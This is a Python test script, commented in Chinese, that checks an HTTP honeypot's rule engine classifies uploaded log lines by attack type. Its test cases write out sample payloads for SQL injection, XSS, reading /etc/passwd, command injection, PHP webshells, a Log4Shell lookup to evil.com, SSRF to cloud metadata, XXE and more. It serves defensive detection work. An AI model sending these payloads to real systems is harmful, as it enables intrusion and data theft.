# -*- coding: utf-8 -*-
"""
HTTP蜜罐正则规则全覆盖测试

测试流程：
  1. 通过内部API上传精心构造的日志
  2. 等待规则引擎处理
  3. 查询日志详情，验证attack_type是否与预期一致
  4. 每条测试载荷只匹配唯一一条规则，验证互斥性

使用方法：
  确保后端 Flask 服务正在运行（默认 http://127.0.0.1:5000）
  python test/test_http_rules_coverage.py
"""

import requests
import time
import sys
import io
import re

# 修复 Windows 控制台 GBK 编码问题
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

BASE_URL = "http://127.0.0.1:5000/api"
INTERNAL_UPLOAD_URL = f"{BASE_URL}/logs/internal/upload"
LOG_DETAIL_URL = f"{BASE_URL}/logs"
LOGIN_URL = f"{BASE_URL}/user/login"
MATCH_RULES_URL = f"{BASE_URL}/match-rules"

ADMIN_USERNAME = "testadmin01"
ADMIN_PASSWORD = "123456"

_auth_token = None
_http_port = 8888


def login() -> str:
    global _auth_token
    if _auth_token:
        return _auth_token
    try:
        resp = requests.post(LOGIN_URL, json={"username": ADMIN_USERNAME, "password": ADMIN_PASSWORD})
        if resp.status_code == 200 and resp.json().get("success"):
            _auth_token = resp.json()["data"]["access_token"]
            return _auth_token

        requests.post(f"{BASE_URL}/user/create_admin", json={
            "username": ADMIN_USERNAME, "password": ADMIN_PASSWORD, "email": "testadmin@test.com"
        })
        resp = requests.post(LOGIN_URL, json={"username": ADMIN_USERNAME, "password": ADMIN_PASSWORD})
        if resp.status_code == 200 and resp.json().get("success"):
            _auth_token = resp.json()["data"]["access_token"]
            return _auth_token
        print("[FATAL] 登录失败")
        sys.exit(1)
    except Exception as e:
        print(f"[FATAL] 无法登录: {e}")
        sys.exit(1)


def get_auth_headers():
    return {"Authorization": f"Bearer {login()}", "Content-Type": "application/json"}


def discover_http_port():
    global _http_port
    try:
        resp = requests.get(f"{BASE_URL}/honeypots", headers=get_auth_headers(), params={"per_page": 100})
        honeypots = resp.json()["data"]["honeypots"]
        for hp in honeypots:
            if hp["type"].upper() == "HTTP":
                _http_port = hp["port"]
                break
    except Exception:
        pass


def get_active_rules():
    """获取系统中所有启用的匹配规则"""
    resp = requests.get(MATCH_RULES_URL, headers=get_auth_headers(), params={"per_page": 100})
    rules = resp.json().get("data", {}).get("rules", [])
    return [r for r in rules if r.get("is_enabled")]


def upload_log(raw_log: str, payload: str = "", request_path: str = "/test", user_agent: str = "Mozilla/5.0") -> int:
    log_data = {
        "honeypot_port": _http_port,
        "attacker_ip": "10.10.10.10",
        "attacker_port": 12345,
        "protocol": "HTTP",
        "raw_log": raw_log,
        "payload": payload,
        "request_path": request_path,
        "user_agent": user_agent,
    }
    resp = requests.post(INTERNAL_UPLOAD_URL, json=log_data)
    if resp.status_code == 200 and resp.json().get("success"):
        return resp.json()["data"].get("log_id")
    return None


def get_log_detail(log_id: int):
    resp = requests.get(f"{LOG_DETAIL_URL}/{log_id}", headers=get_auth_headers())
    if resp.status_code == 200 and resp.json().get("success"):
        return resp.json()["data"]
    return None


# =====================================================================
# 测试用例：每条规则对应独立的攻击载荷，确保互斥
# 设计原则：
#   - 每条payload只包含目标规则的特征关键字
#   - 不包含其他规则的关键字，避免交叉匹配
# =====================================================================
TEST_CASES = [
    # === 1. SQL注入 ===
    {
        "name": "SQL注入 - SELECT关键字",
        "raw_log": "GET /api/users?id=1 UNION SELECT username,password FROM accounts HTTP/1.1",
        "expected_type": "SQL注入",
    },
    {
        "name": "SQL注入 - SLEEP盲注",
        "raw_log": "GET /api/items?id=1 AND SLEEP(5) HTTP/1.1",
        "expected_type": "SQL注入",
    },
    {
        "name": "SQL注入 - DROP TABLE",
        "raw_log": "GET /admin?q=; DROP TABLE users HTTP/1.1",
        "expected_type": "SQL注入",
    },
    # === 2. XSS ===
    {
        "name": "XSS - script标签",
        "raw_log": "GET /search?q=<script>alert(1)</script> HTTP/1.1",
        "expected_type": "XSS",
    },
    {
        "name": "XSS - 事件属性",
        "raw_log": "GET /page?name=<img src=x onerror=alert(1)> HTTP/1.1",
        "expected_type": "XSS",
    },
    {
        "name": "XSS - javascript伪协议",
        "raw_log": "GET /redirect?url=javascript:alert(document.cookie) HTTP/1.1",
        "expected_type": "XSS",
    },
    # === 3. 目录遍历 ===
    {
        "name": "目录遍历 - ../穿越",
        "raw_log": "GET /static/../../../../etc/passwd HTTP/1.1",
        "expected_type": "目录遍历",
    },
    {
        "name": "目录遍历 - /etc/shadow",
        "raw_log": "GET /download?f=/etc/shadow HTTP/1.1",
        "expected_type": "目录遍历",
    },
    # === 4. 命令注入 ===
    {
        "name": "命令注入 - whoami",
        "raw_log": "POST /api/check HTTP/1.1\r\n\r\nhost=127.0.0.1 whoami",
        "expected_type": "命令注入",
    },
    {
        "name": "命令注入 - uname",
        "raw_log": "POST /api/diagnostic HTTP/1.1\r\n\r\ntarget=10.0.0.1 uname -a",
        "expected_type": "命令注入",
    },
    {
        "name": "命令注入 - ifconfig",
        "raw_log": "POST /api/network HTTP/1.1\r\n\r\naction=ifconfig eth0",
        "expected_type": "命令注入",
    },
    # === 5. WebShell ===
    {
        "name": "WebShell - eval函数",
        "raw_log": "POST /upload/shell.php HTTP/1.1\r\n\r\neval($_POST['cmd'])",
        "expected_type": "WebShell",
    },
    {
        "name": "WebShell - 蚁剑指纹",
        "raw_log": "POST /images/logo.php HTTP/1.1\r\n\r\nantsword connection established",
        "expected_type": "WebShell",
    },
    {
        "name": "WebShell - PHP标签",
        "raw_log": "POST /upload HTTP/1.1\r\n\r\n<?php passthru('dir');?>",
        "expected_type": "WebShell",
    },
    # === 6. RCE ===
    {
        "name": "RCE - Log4Shell JNDI",
        "raw_log": "GET / HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://evil.com/a}",
        "expected_type": "RCE",
    },
    {
        "name": "RCE - ProcessBuilder",
        "raw_log": "POST /api HTTP/1.1\r\n\r\nnew ProcessBuilder(cmd).start()",
        "expected_type": "RCE",
    },
    {
        "name": "RCE - Fastjson AutoType",
        "raw_log": 'POST /api HTTP/1.1\r\n\r\n{"@type":"com.sun.rowset.JdbcRowSetImpl"}',
        "expected_type": "RCE",
    },
    # === 7. 文件包含 ===
    {
        "name": "文件包含 - php://filter",
        "raw_log": "GET /?file=php://filter/read=convert.base64-encode/resource=config.php HTTP/1.1",
        "expected_type": "文件包含",
    },
    {
        "name": "文件包含 - phar://",
        "raw_log": "GET /view?tpl=phar:///tmp/evil.phar HTTP/1.1",
        "expected_type": "文件包含",
    },
    # === 8. SSRF ===
    {
        "name": "SSRF - 云元数据",
        "raw_log": "GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1",
        "expected_type": "SSRF",
    },
    {
        "name": "SSRF - gopher协议",
        "raw_log": "GET /fetch?target=gopher://127.0.0.1:6379/_INFO HTTP/1.1",
        "expected_type": "SSRF",
    },
    # === 9. 扫描探测 ===
    {
        "name": "扫描探测 - Nmap",
        "raw_log": "GET / HTTP/1.1",
        "user_agent": "nmap scripting engine",
        "expected_type": "扫描探测",
    },
    {
        "name": "扫描探测 - Nuclei",
        "raw_log": "GET /robots.txt HTTP/1.1",
        "user_agent": "nuclei v2.9.0",
        "expected_type": "扫描探测",
    },
    {
        "name": "扫描探测 - SQLMap",
        "raw_log": "GET / HTTP/1.1",
        "user_agent": "sqlmap/1.7",
        "expected_type": "扫描探测",
    },
    # === 10. 暴力破解 ===
    {
        "name": "暴力破解 - Failed password",
        "raw_log": "Failed password for root from 10.10.10.10 port 22 ssh2",
        "expected_type": "暴力破解",
    },
    {
        "name": "暴力破解 - LOGIN FAILED",
        "raw_log": "LOGIN FAILED for admin from 10.10.10.10",
        "expected_type": "暴力破解",
    },
    # === 11. XXE ===
    {
        "name": "XXE - ENTITY声明",
        "raw_log": 'POST /xml HTTP/1.1\r\n\r\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>',
        "expected_type": "XXE",
    },
    {
        "name": "XXE - XInclude",
        "raw_log": 'POST /parse HTTP/1.1\r\n\r\n<xi:include href="file:///etc/hostname"/>',
        "expected_type": "XXE",
    },
    # === 12. LDAP注入 ===
    {
        "name": "LDAP注入 - objectClass通配",
        "raw_log": "GET /search?user=(objectClass=*) HTTP/1.1",
        "expected_type": "LDAP注入",
    },
    {
        "name": "LDAP注入 - ldap协议",
        "raw_log": "GET /query?target=ldap://10.0.0.1:389/dc=example HTTP/1.1",
        "expected_type": "LDAP注入",
    },
    # === 13. 反序列化 ===
    {
        "name": "反序列化 - Java魔术头",
        "raw_log": "POST /api HTTP/1.1\r\n\r\naced0005sr0017java.util.HashMap",
        "expected_type": "反序列化",
    },
    {
        "name": "反序列化 - ysoserial工具",
        "raw_log": "POST /deserialize HTTP/1.1\r\n\r\nysoserial payload CommonsCollections5",
        "expected_type": "反序列化",
    },
    {
        "name": "反序列化 - PHP unserialize",
        "raw_log": "POST /api HTTP/1.1\r\n\r\ndata=O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";}",
        "expected_type": "反序列化",
    },
    # === 14. CRLF注入 ===
    {
        "name": "CRLF注入 - %0d%0a注入",
        "raw_log": "GET /redirect?url=http://example.com%0d%0aSet-Cookie:session=evil HTTP/1.1",
        "expected_type": "CRLF注入",
    },
    # === 15. 信息泄露 ===
    {
        "name": "信息泄露 - .git目录",
        "raw_log": "GET /.git/config HTTP/1.1",
        "expected_type": "信息泄露",
    },
    {
        "name": "信息泄露 - .env文件",
        "raw_log": "GET /.env HTTP/1.1",
        "expected_type": "信息泄露",
    },
    {
        "name": "信息泄露 - 备份文件",
        "raw_log": "GET /database.sql.bak HTTP/1.1",
        "expected_type": "信息泄露",
    },
    # === 正常流量（不应匹配任何攻击规则） ===
    {
        "name": "正常流量 - 普通GET请求",
        "raw_log": "GET /index.html HTTP/1.1",
        "expected_type": "正常流量",
    },
    {
        "name": "正常流量 - 静态资源",
        "raw_log": "GET /static/css/style.css HTTP/1.1",
        "expected_type": "正常流量",
    },
]


def run_tests():
    print("=" * 70)
    print("  HTTP蜜罐正则规则全覆盖测试")
    print("=" * 70)

    login()
    discover_http_port()

    rules = get_active_rules()
    if not rules:
        print("[ERROR] 未找到任何启用的匹配规则！")
        sys.exit(1)

    print(f"找到 {len(rules)} 条已启用的匹配规则")
    print(f"共 {len(TEST_CASES)} 个测试用例\n")

    # 统计每个规则的attack_type，用于检查覆盖率
    rule_attack_types = set(r["attack_type"] for r in rules)
    tested_types = set()

    passed = 0
    failed = 0

    for tc in TEST_CASES:
        name = tc["name"]
        raw_log = tc["raw_log"]
        expected = tc["expected_type"]
        user_agent = tc.get("user_agent", "Mozilla/5.0")

        print(f"[*] {name}")
        print(f"    载荷: {raw_log[:80]}{'...' if len(raw_log) > 80 else ''}")

        log_id = upload_log(
            raw_log=raw_log,
            user_agent=user_agent,
        )
        if not log_id:
            print(f"    [FAIL] 日志上传失败")
            failed += 1
            continue

        time.sleep(0.3)

        detail = get_log_detail(log_id)
        if not detail:
            print(f"    [FAIL] 无法获取日志详情 (log_id={log_id})")
            failed += 1
            continue

        actual = detail.get("attack_type")

        if actual == expected:
            print(f"    [PASS] 识别类型: {actual}")
            passed += 1
            tested_types.add(expected)
        else:
            print(f"    [FAIL] 期望: {expected}，实际: {actual}")
            print(f"           描述: {detail.get('attack_description')}")
            failed += 1

    # 覆盖率检查
    print("\n" + "=" * 70)
    print("  覆盖率报告")
    print("=" * 70)

    uncovered = rule_attack_types - tested_types - {"正常流量"}
    if uncovered:
        print(f"[WARN] 以下规则未被测试覆盖: {', '.join(uncovered)}")
    else:
        print("[OK] 所有启用的规则均已被测试覆盖")

    print(f"\n已测试攻击类型: {', '.join(sorted(tested_types))}")

    print("\n" + "=" * 70)
    print(f"  测试结果: 总计 {passed + failed}, 成功 {passed}, 失败 {failed}")
    print("=" * 70)

    if failed > 0:
        sys.exit(1)
    else:
        print("\n✅ 所有测试通过！")
        sys.exit(0)


if __name__ == "__main__":
    run_tests()
